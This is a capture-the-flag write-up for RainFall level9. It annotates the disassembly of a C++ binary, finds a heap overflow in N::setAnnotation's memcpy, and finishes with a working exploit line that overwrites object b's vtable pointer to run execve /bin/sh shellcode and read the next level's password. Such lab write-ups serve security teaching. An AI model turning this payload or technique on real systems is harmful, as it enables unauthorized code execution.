```
   0x080485f4 <+0>:	push   %ebp
   0x080485f5 <+1>:	mov    %esp,%ebp
   0x080485f7 <+3>:	push   %ebx
   0x080485f8 <+4>:	and    $0xfffffff0,%esp
   0x080485fb <+7>:	sub    $0x20,%esp
   0x080485fe <+10>:	cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   <10> - <14>: jump to main+28 if argc > 1
   0x08048604 <+16>:	movl   $0x1,(%esp)
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	movl   $0x6c,(%esp)
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:	mov    %eax,%ebx
   <28> - <40>: initialization of a new operator (a = new(108))
   0x0804861e <+42>:	movl   $0x5,0x4(%esp) -2nd arg
   0x08048626 <+50>:	mov    %ebx,(%esp) -first arg(our class)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei> 
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp) - stores value of new object A in 0x1c(%esp)
   <28> - <58>: N a = new N(5)
   0x08048632 <+62>:	movl   $0x6c,(%esp)
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   <62> - <69>: initialization of a new operator (b = new(108))
   0x0804863e <+74>:	mov    %eax,%ebx
   0x08048640 <+76>:	movl   $0x6,0x4(%esp)
   0x08048648 <+84>:	mov    %ebx,(%esp)
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei> - new class obj
   0x08048650 <+92>:	mov    %ebx,0x18(%esp) - stores value of new object B in 0x18(%esp)
   <62> - <92>: N b = new N(6)
   0x08048654 <+96>:	mov    0x1c(%esp),%eax
   0x08048658 <+100>:	mov    %eax,0x14(%esp)
   <96> - <100>: saves obj a at 0x14(%esp)
   0x0804865c <+104>:	mov    0x18(%esp),%eax
   0x08048660 <+108>:	mov    %eax,0x10(%esp)
   <104> - <108>: saves obj b at 0x10(%esp)
   0x08048664 <+112>:	mov    0xc(%ebp),%eax
   0x08048667 <+115>:	add    $0x4,%eax
   0x0804866a <+118>:	mov    (%eax),%eax
   0x0804866c <+120>:	mov    %eax,0x4(%esp)
   <112> - <120>: takes value of argv[1] and sets as 2nd arg
   0x08048670 <+124>:	mov    0x14(%esp),%eax 
   0x08048674 <+128>:	mov    %eax,(%esp) - 'a' obj as first arg
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    0x10(%esp),%eax - *b = eax
   0x08048680 <+140>:	mov    (%eax),%eax - loads the vtable address from the object
   0x08048682 <+142>:	mov    (%eax),%edx - loads function pointer at index 0 from vtable
   0x08048684 <+144>:	mov    0x14(%esp),%eax - eax = a
   0x08048688 <+148>:	mov    %eax,0x4(%esp) - 2nd arg for edx call
   0x0804868c <+152>:	mov    0x10(%esp),%eax - b in eax
   0x08048690 <+156>:	mov    %eax,(%esp) - eax(b) as 1st arg for edx call
   0x08048693 <+159>:	call   *%edx - call to *b->vtable[0](*a)
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx - store return func in ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret   
```
!!!Pro tip: We can use  `c++filt` to see better the name of the functions !!!
```
level9@RainFall:~$ c++filt _ZN1N13setAnnotationEPc
N::setAnnotation(char*)
```
It apears we have a class obj in c++ that has multiple methods
```
(gdb)info func
...
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
...
```
\_ZN1NC2Ei(N::N(int))
```
Dump of assembler code for function _ZN1NC2Ei:
   0x080486f6 <+0>:	push   %ebp
   0x080486f7 <+1>:	mov    %esp,%ebp
   0x080486f9 <+3>:	mov    0x8(%ebp),%eax - eax = this obj (N)
   0x080486fc <+6>:	movl   $0x8048848,(%eax) *eax = vtable.N[0]
   0x08048702 <+12>:	mov    0x8(%ebp),%eax
   0x08048705 <+15>:	mov    0xc(%ebp),%edx - 2nd arg(prob int val)
   0x08048708 <+18>:	mov    %edx,0x68(%eax) - 2nd arg placed at offset of 104 bytes from our class
   0x0804870b <+21>:	pop    %ebp
   0x0804870c <+22>:	ret
   There might be a char[100] in our class
```
\_ZN1N13setAnnotationEPc(N::setAnnotation(char*))
```
   0x0804870e <+0>:	push   %ebp
   0x0804870f <+1>:	mov    %esp,%ebp
   0x08048711 <+3>:	sub    $0x18,%esp
   0x08048714 <+6>:	mov    0xc(%ebp),%eax - eax = argv
   0x08048717 <+9>:	mov    %eax,(%esp) - arg for strlen
   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
   0x0804871f <+17>:	mov    0x8(%ebp),%edx - edx = *this
   0x08048722 <+20>:	add    $0x4,%edx - this + 4 (this->char)
   0x08048725 <+23>:	mov    %eax,0x8(%esp) - set lenght for 3rd position
   0x08048729 <+27>:	mov    0xc(%ebp),%eax - eax = argv
   0x0804872c <+30>:	mov    %eax,0x4(%esp) - 2nd arg for memcpy
   0x08048730 <+34>:	mov    %edx,(%esp) - this->char 1st arg
   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
   memcpy(this->char, argv[1], strlenght(argv[1]))
   0x08048738 <+42>:	leave  
   0x08048739 <+43>:	ret 
```
\_ZN1NplERS_(N::operator+(N&))
```
 804873a:	55           push   %ebp
 804873b:	89 e5        mov    %esp,%ebp
 804873d:	8b 45 08     mov    0x8(%ebp),%eax - eax = *this
 8048740:	8b 50 68     mov    0x68(%eax),%edx - edx = this->int
 8048743:	8b 45 0c     mov    0xc(%ebp),%eax - eax = argv
 8048746:	8b 40 68     mov    0x68(%eax),%eax - eax = this->int
 8048749:	01 d0        add    %edx,%eax this->int + argv
 804874b:	5d           pop    %ebp
 804874c:	c3           ret    
```
\_ZN1NmiERS_(N::operator-(N&))
```
   0x0804874e <+0>:	push   %ebp
   0x0804874f <+1>:	mov    %esp,%ebp
   0x08048751 <+3>:	mov    0x8(%ebp),%eax - eax = *this*
   0x08048754 <+6>:	mov    0x68(%eax),%edx - edx = this->int
   0x08048757 <+9>:	mov    0xc(%ebp),%eax - eax = argv
   0x0804875a <+12>:	mov    0x68(%eax),%eax - argv->int
   0x0804875d <+15>:	mov    %edx,%ecx - ecx = this->int
   0x0804875f <+17>:	sub    %eax,%ecx - argv->int - this->int
   0x08048761 <+19>:	mov    %ecx,%eax - store res in eax
   0x08048763 <+21>:	pop    %ebp
   0x08048764 <+22>:	ret  
```
Now we know that we will return the call to %edx wich represents the first entry of the virtual table for object b. 
Also there are no checks for our argument so we can write in memory as much as we want. With this information we could try overflowing into object b as they are placed next to eachother on the heap.
First we need to check the distance betwwen object a and b.
```
level9@RainFall:~$ ltrace ./level9 AAAAAAAAa
__libc_start_main(0x80485f4, 2, 0xbffff6f4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)   = 0
_Znwj(108, 0xbffff6f4, 0xbffff700, 0xb7d79e55, 0xb7fed280)              = 0x804a008
_Znwj(108, 5, 0xbffff700, 0xb7d79e55, 0xb7fed280)                       = 0x804a078
strlen("AAAAAAAAa")                                                     = 9
memcpy(0x0804a00c, "AAAAAAAAa", 9)                                      = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fce4a0
+++ exited (status 11) +++

(gdb) p /d 0x804a078 - 0x804a008
$1 = 112
```
Second we will subtract the size for address of the first entry for the virtual table and another 4 bytes for the stored int , so the distance between our a buffer and  the first entry of the vtable for b will be `112 - 4 = 108`
Now to better understand how the flow of the payload will work:
- the entry for the virtual table is pointing to an address that should execute the method
- overflowing the vtable entry will redirect program flow, so we change it to the address of our a buffer
-  the address that is pointed to by the vtable will hold the actual code that will be executed so we have to derefrence again to actually execute the code
- we will have to overflow in the b object, overwrite the vtable address with the address of our buffer and than the begging of our buffer will contain the address of our execve payload which will come just after it, followed by padding up to the begging of our object b
Shell code: https://www.exploit-db.com/exploits/42428
```
a buffer = {
[shell-addr] = 4 bytes
[shell-code] = 24 bytes
[padding] = 80 bytes - here we filled up to obj b
[address of a buffer] = 4 bytes - begging of vtable for obj b
} = 108 + 4 bytes
```

```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 80 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
